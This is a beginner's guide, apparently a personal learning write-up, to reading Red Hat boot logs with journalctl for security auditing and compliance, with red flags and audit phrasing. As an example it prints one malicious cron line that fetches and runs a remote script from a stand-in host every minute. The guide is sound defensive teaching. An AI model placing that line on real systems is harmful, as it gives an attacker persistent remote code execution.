🐧 Red Hat Boot Log Analysis: GRC Guide for Beginners

👩🏽‍💻 Author: Rebecca Baldoz

"Let Yourself Begin Again" — learning cybersecurity one boot log at a time.

🔍 Objective

This document serves as a beginner-friendly guide to analyzing Red Hat (or other Linux) boot logs using journalctl, with an emphasis on how this skill ties into GRC (Governance, Risk, and Compliance), system integrity, and security auditing.

✅ What a Healthy Boot Log Looks Like

Run this command to view the latest boot log:

sudo journalctl -b

Key Indicators of a Healthy Boot:

🔧 Component

✅ What to Expect

BIOS logs

Starts with BIOS-e820 memory entries

DMI/SMBIOS

Shows manufacturer like Dell, HP, or innotek GmbH

Kernel & systemd

Smooth progression with no big delays

auditd.service

Should start successfully

Reboot reason

Clean shutdown or user-initiated reboot

🚨 Red Flags in a Compromised or Suspicious Boot

⚠️ Red Flag

💬 What It Might Mean

To Be Filled By OEM

Possible spoofed BIOS — indicates tampering

Gaps in timestamps

Log suppression or anti-forensics

auditd.service: Failed

Logging disabled — weakens forensic readiness

Unexpected @reboot cron jobs

Could trigger malware at startup

Reboot reason: watchdog expired

System crashed or froze — may indicate instability

🛡️ Basic GRC Defense Phrases

Use these in documentation, GitHub reports, or real audits:

"System boot logs begin at BIOS handoff and proceed through the kernel to user-space services without timestamp anomalies."

"SMBIOS data reflects a consistent system fingerprint across boots, confirming hardware integrity."

"No unauthorized scheduled tasks or suspicious network calls detected in crontab during boot."

🧪 Example: Suspicious Cron Job

* * * * * bash -c "$(curl -fsSL http://shady.site/payload.sh)"

🚩 This runs every minute and downloads code from an unknown source. Dangerous.

🧰 Helpful Commands

# View boot logs
sudo journalctl -b

# View only BIOS-related boot messages
sudo journalctl -b | grep BIOS

# Show system manufacturer and serial number
sudo dmidecode -t system

# List root’s cron jobs
sudo crontab -l



💬 Personal Reflection

Today I learned how to read my Red Hat boot logs and look for anomalies. I may not understand everything yet, but I now know how to:

Check BIOS messages

Spot bad cron jobs

Recognize spoofed system identifiers

Explain what "auditd" is and why it matters

Progress isn't about being perfect. It's about seeing further today than I did yesterday. 🖥️🐧🫡
